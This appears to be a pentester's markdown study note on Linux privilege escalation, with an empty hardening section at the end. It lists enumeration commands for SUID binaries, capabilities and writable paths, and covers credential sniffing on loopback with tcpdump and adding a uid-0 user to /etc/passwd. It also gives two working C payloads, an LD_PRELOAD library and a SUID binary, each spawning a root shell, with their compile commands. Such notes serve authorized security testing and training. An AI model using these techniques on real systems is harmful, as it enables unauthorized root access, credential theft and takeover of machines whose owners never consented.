---
tags:
  - "#type/tech-specific"
---
# Fundamentals

See:

- [[2 Tech-Specifics/OS/Linux/Privilege Escalation Linux/Overview - Privilege Escalation Linux|Overview - Privilege Escalation Linux]]
- [[2 Tech-Specifics/OS/Linux/Privilege Escalation Linux/Manual Enumeration - Linux|Manual Enumeration - Linux]]

**Kompendium of useful executables: [https://gtfobins.github.io/](https://gtfobins.github.io/)**

# Pentesting

## Sudo Priviliges

1. `sudo -l` to see what commands the user can run with sudo
2. check if they can be used to drop a shell
	- [https://gtfobins.github.io/](https://gtfobins.github.io/)
	- research online if the tool can run commands

## SUID/GUID Binaries

- SUID files always **run as the file owner**, not the user who executes it
- GUID files **run with the file owners group privileges**

Attack vector: try to use the executable to drop a shell

**Workflow**

1. Enumerate SUID binaries

| Command                                                                                     | Purpose                             |
| ------------------------------------------------------------------------------------------- | ----------------------------------- |
| `find / -perm -u=s -type f 2>/dev/null` or<br>`find / -type f -perm -04000 -ls 2>/dev/null` | find all files with SUID permission |
| `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`           | find all SUID/SGID files            |

2. check if they can be used to drop a shell
	- [https://gtfobins.github.io/](https://gtfobins.github.io/)
	- research online if the tool can run commands

## Capabilities

Similar to the SUID permission. However, a capability adds root-level privileges for a specific action/purpose only.

**Workflow**

1. find files with capabilities set: `/usr/sbin/getcap -r / 2>/dev/null`
	- Note: `getcap` is not always present in PATH
2. check [gtfobins](https://gtfobins.github.io/) if any of the binaries can be abused

## Leaked Credentials

Credentials can be leaked in multiple ways:

- Sensitive files:
	- [[2 Tech-Specifics/OS/Sensitive Files|Sensitive Files]]
	- dotfiles & configs of services
	- `.bashrc`
- Environment variables:
	- `env`
- capture network traffic on the localhost & dump in ASCII format:
	- `sudo tcpdump -i lo -A`
	- then, e.g. grep for "pass"
- command-line arguments of processes
	- see [[2 Tech-Specifics/OS/Linux/Privilege Escalation Linux/Manual Enumeration - Linux#Processes & Services|Basic Enumeration Linux]]

## Writable /etc/passwd

If `/etc/passwd` is writable, you can

- add a new user
- edit existing users:
	- group
	- override the password specified in `/etc/shadow`

Also see [[2 Tech-Specifics/OS/Linux/Fundamentals - Linux#/etc/passwd|Fundamentals Linux]].

1. check privileges: `ls -l /etc/passwd`
2. generate a password using [[3 Tools/crypto/openssl|openssl]]
3. add line to /etc/passwd: e.g. `newroot:<hash>:0:0:root:/root:/bin/bash`

## Writeable /etc/sudoers

if writable, add your user to sudoers

## Hijack Cronjobs

If the file the cronjob is running is writeable by other users, we can hijack the cronjob. If cronjob runs as another user --> privilege escalation.

**Workflow**

1. Enumerate using [[2 Tech-Specifics/OS/Linux/Privilege Escalation Linux/Manual Enumeration - Linux#Scheduled Tasks|Basic Enumeration Linux]]
2. Check privileges on the cronjobs file (`ls -l`)
3. edit or replace the file, e.g. to add a user or run a [[1 Methods/Security-Testing/3 Initial Access/Remote Shells|Remote Shells]]

**Possible scenario:**

1. System administrators need to run a script at regular intervals.
2. They create a cron job to do this
3. After a while, the script becomes useless, and they delete it
4. They do not clean the relevant cron job

## Kernel Exploits

1. Identify the kernel version - see [[2 Tech-Specifics/OS/Linux/Privilege Escalation Linux/Manual Enumeration - Linux#System Info|Basic Enumeration Linux]]
2. Search and find an exploit code for the kernel version of the target system
	- try to match the kernel version & OS flavour as closely as possible
	- see [[1 Methods/Security-Testing/4 Execution/Using Public Exploits|Using Public Exploits]]
	- in [[3 Tools/exploitation frameworks/SearchSploit|SearchSploit]] include "Linux Kernel", the major version and "Privilege Escalation"
3. Run the exploit
resource:
[https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)

## LD_PRELOAD

LD_PRELOAD is a function that allows any program to use shared libraries.

1. Check for LD_PRELOAD (use `sudo -l` and look for `env_keep` option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

C Code:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
} 
``` 

compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

## PATH

If a program which is running as root ( e.g. with SUID privileges) calls a system command, you can inject the command in its PATH --> the tool will run that command

**Prerequisites:**

- writeable folders in PATH or PATH can be changed
- application with root privileges relies on PATH

**Workflow**

1. search for writeable folders: `find / -writable 2>/dev/null`
2. search for subdirectories of writeable folders: `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
3. modify PATH: `export PATH=/tmp:$PATH`

## NFS

[[2 Tech-Specifics/Network/Protocols/TCP 111,2049 NFS]]

critical option for privesc: rw, no_root_sqash

1. connect to nfs
2. generate file that launches bash (see section payloads)
3. set ownership of file to "root" and set suid
4. execute on target system -> root shell is started

## Payloads

c code to execute shell with suid and guid set

compile with: `gcc [filename] -o [filename] -w`

set suid with `chmod +s [filename]`

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	setgid(0);
	setuid(0);
	system("/bin/bash -p");
	return 0;
}
``` 

# Hardening
